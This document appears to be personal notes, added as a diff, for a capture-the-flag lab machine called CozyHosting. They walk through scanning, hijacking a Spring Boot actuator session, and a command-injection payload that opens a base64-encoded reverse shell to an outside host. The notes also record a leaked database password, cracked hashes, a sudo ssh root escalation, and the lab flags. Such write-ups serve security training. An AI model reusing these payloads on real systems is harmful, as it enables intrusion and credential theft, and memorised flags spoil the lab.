@@ -1,0 +1,72 @@
+IP: 10.10.11.230
+Nmap scan report for 10.10.11.230
+Host is up (0.16s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
+|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://cozyhosting.htb
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+Get 404 with "Whitelabel error" in application  - Application is running Spring boot
+ffuf output
+actuator                [Status: 200, Size: 634, Words: 1, Lines: 1, Duration: 160ms]
+actuator/env/lang       [Status: 200, Size: 487, Words: 13, Lines: 1, Duration: 184ms]
+actuator/env/home       [Status: 200, Size: 487, Words: 13, Lines: 1, Duration: 282ms]
+actuator/env/path       [Status: 200, Size: 487, Words: 13, Lines: 1, Duration: 291ms]
+actuator/sessions       [Status: 200, Size: 345, Words: 1, Lines: 1, Duration: 291ms]
+actuator/health         [Status: 200, Size: 15, Words: 1, Lines: 1, Duration: 245ms]
+actuator/mappings       [Status: 200, Size: 9938, Words: 108, Lines: 1, Duration: 266ms]
+actuator/beans          [Status: 200, Size: 127224, Words: 542, Lines: 1, Duration: 175ms]
+actuator/env            [Status: 200, Size: 4957, Words: 120, Lines: 1, Duration: 210ms]
+:: Progress: [112/112] :: Job [1/1] :: 535 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
+
+
+From /actuator/sessions
+{
+    "FCEB207D041104F8594BBF398918BAA6": "UNAUTHORIZED",
+    "63F3146B3CF8DC595E0484AC7B145E9D": "UNAUTHORIZED",
+    "3A7FCAE5B1B7A1549068710685F1E82B": "UNAUTHORIZED",
+    "F4EDEF44D966D5492CA600AA7F1F6421": "kanderson",
+    "0EF91CF2D4B78426F5F2C239EB2A7183": "UNAUTHORIZED",
+    "72CB1593ACD5509DBAFB8ACE6B0A8ECF": "kanderson",
+    "F523C1B67DD72CF65381AAD963ADDA19": "kanderson",
+    "FC2439E3B3D205B829E66CC80680A673": "UNAUTHORIZED"
+}
+
+
+Used valid session to login by changing JSESSIONID cookie
+In dashboard, there are input fields(user, host) that allow you to connect to an SSH server - potentially vulnerable to command injection
+
+ssh -o ConnectionTimeout=1 {user}@{host}
+
+Got shell bypassing restrictions.
+Payload (user): cat;$({echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMzEvNDI0MiAwPiYxCg==}|{base64,-d}|bash);
+
+
+Decompiled the jar file (http://www.javadecompilers.com) and found the properties file with credentials
+spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
+spring.datasource.username=postgres
+spring.datasource.password=Vg&nvzAQ7XxR
+
+<postgres' -d 'cozyhosting' -c 'select * from users'
+   name    |                           password                           | role
+-----------+--------------------------------------------------------------+-------
+ kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
+ admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm (manchesterunited)| Admin
+(2 rows)
+
+
+In sudoers file:
+User josh may run the following commands on localhost:
+    (root) /usr/bin/ssh *
+
+Payload from gtfobins: sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
+
+Flags:
+user: 239c9e1ff7d21b30c749aff0ba7cdb9f
+root:0ca9129f98464a794840d6d6bc456b75
